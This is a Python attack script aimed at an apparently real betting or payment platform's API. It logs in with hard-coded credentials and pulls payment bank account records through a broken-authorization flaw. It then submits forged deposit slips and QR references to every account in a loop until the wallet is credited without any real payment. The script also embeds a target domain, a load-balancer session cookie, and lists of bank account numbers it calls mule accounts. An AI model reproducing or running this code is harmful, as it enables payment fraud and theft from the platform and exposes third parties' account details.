#!/usr/bin/env python3
"""probe_all_banks.py — Try deposit via every active payment bank account.

   BREAKTHROUGH: mgapi POST /mb/auto-slip-deposit returns 500 (not 401!)
   - Auth IS passing (JWT works)
   - Bank account 18a9502b is "currently unavailable"
   - Need to try ALL other bank accounts from BOLA dump

   From BOLA /bo/info/payment-bank-account — all accounts with bank_no:
   e6e2d40c 0963917854, b4b5b2d0 4172274759, 3b2db12d 1704275050,
   18a9502b 2373102108, b4c8b1da 8112742635 ... (50+ more)

   Also: 3rd party gateways (AZPAY, One2p, 2sec, MYPAYS24, Pompay, Q...)
   with empty bank_no but might auto-credit.
"""
import base64, json, pathlib, requests, sys, time, uuid

sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def fresh_auth():
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    return None

JWT = fresh_auth() or JWT_FILE.read_text().strip()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else r.json().get("balance","?")
    return f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# Get fresh QR
now = datetime.now(timezone.utc) + timedelta(hours=7)
tx_ref = generate_tx_reference(now)
fresh_qr = generate_qr_data(tx_ref)
print(f"Fresh QR: tx_ref={tx_ref}\n")

# Full list of payment bank accounts from BOLA (id → bank_no)
# First, ALL 3rd party gateways (empty bank_no) — try with no deposit_account_id
GATEWAYS = [
    ("b08a736f-3392-4595-bad5-776ef272af22", "2sec"),
    ("6baf8395-34f8-4d1c-9470-340c44c9f01b", "AZPAY"),
    ("798b5076-cf24-4ce2-ad47-09af6e15b809", "kissvipauto"),
    ("59251130-7cf4-47bd-a9c7-af899f5b1ab9", "MYPAYS24"),
    ("ac99fb0e-0ce2-46eb-9bde-348243721157", "One2p"),
    ("249a7b33-55c0-441a-844d-d2f43777f8f2", "Pompay"),
    ("855d7148-3126-4a6d-891f-ff9fd38b53b7", "Q?"),
    ("c040d523", "unknown1"),
    ("f9d8ef3d", "unknown2"),
    ("96d4101f", "unknown3"),
]

# Real bank mule accounts (with bank_no)
MULE_ACCOUNTS = [
    ("e6e2d40c-????-????-????-????????????", "0963917854"),
    ("b4b5b2d0-????-????-????-????????????", "4172274759"),
    ("3b2db12d-????-????-????-????????????", "1704275050"),
    ("18a9502b-94ae-4188-8841-094be8b3b974", "2373102108"),  # KBANK (was used before)
    ("b4c8b1da-????-????-????-????????????", "8112742635"),
    ("a787e3e6-????-????-????-????????????", "7082299821"),
    ("a51c4c94-????-????-????-????????????", "5714049883"),
    ("d828632a-????-????-????-????????????", "1178595896"),
    ("99861f67-????-????-????-????????????", "0806045316"),
    ("20ec515f-????-????-????-????????????", "0928381130"),
]

# First re-fetch the full payment-bank-account list to get proper UUIDs
print("=== Re-fetching full payment-bank-account list ===")
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
r_bank = requests.get(f"{BGAPI}/bo/info/payment-bank-account",
                      headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                      params={"domain": DOMAIN},
                      timeout=15)
all_accounts = []
if r_bank.ok:
    data = r_bank.json()
    items = data if isinstance(data, list) else data.get("data", [data])
    for item in items:
        bid = item.get("id", "")
        bno = item.get("bank_no") or item.get("account_no") or ""
        bname = item.get("payment_name", item.get("bank_code", "?"))
        btype = item.get("payment_type_code", item.get("bank_code", "?"))
        active = item.get("is_active", item.get("status", True))
        all_accounts.append((bid, bno, bname, btype, active))
    print(f"  {len(all_accounts)} accounts loaded")
else:
    print(f"  Failed: {r_bank.status_code}")

# Try deposit with each account
print("\n=== Testing deposits on each payment account ===")
success = False
for idx, (bid, bno, bname, btype, active) in enumerate(all_accounts):
    if not bid:
        continue
    # Generate fresh QR for each attempt
    now2 = datetime.now(timezone.utc) + timedelta(hours=7, seconds=idx*2)
    tx2 = generate_tx_reference(now2)
    qr2 = generate_qr_data(tx2)

    payload = {
        "payment_bank_information_id": bid,
        "deposit_amount": 100,
        "note": "$",
        "slip_image_url": f"slip_{tx2[:8]}.jpg",
        "qr_string": qr2,
    }
    # For gateways (empty bank_no), try without deposit_account_id
    if bno:
        payload["deposit_account_id"] = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json=payload, timeout=12)

    err_msg = ""
    if r.status_code != 200:
        try:
            err_msg = r.json().get("message", {}).get("en", r.text[:60]) if r.ok else \
                      r.text[:80] if isinstance(r.text, str) else str(r.json())[:60]
        except Exception:
            err_msg = r.text[:60]
        err_msg = str(err_msg)[:70]

    print(f"  [{idx+1:2d}] {bname:15} | {btype:20} | bank_no={bno or '<empty>':12} | "
          f"HTTP {r.status_code}: {err_msg}")

    if r.ok:
        try:
            body = r.json()
            dep_id = body.get("id") or body.get("data", {}).get("id")
            status = body.get("status") or body.get("data", {}).get("status")
            print(f"        [!!!] deposit_id={dep_id} status={status}")
            if status in ("approved", "success", "completed"):
                print(f"  [!!!] AUTO-CREDITED!")
                success = True
                break
            elif status == "pending" or status == "waiting":
                print(f"  [!!!] In queue (still need approval for {bname})")
        except Exception as e:
            print(f"        parse err: {e}")
    time.sleep(0.5)

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
if success:
    print("[!!!] WALLET CREDITED!")
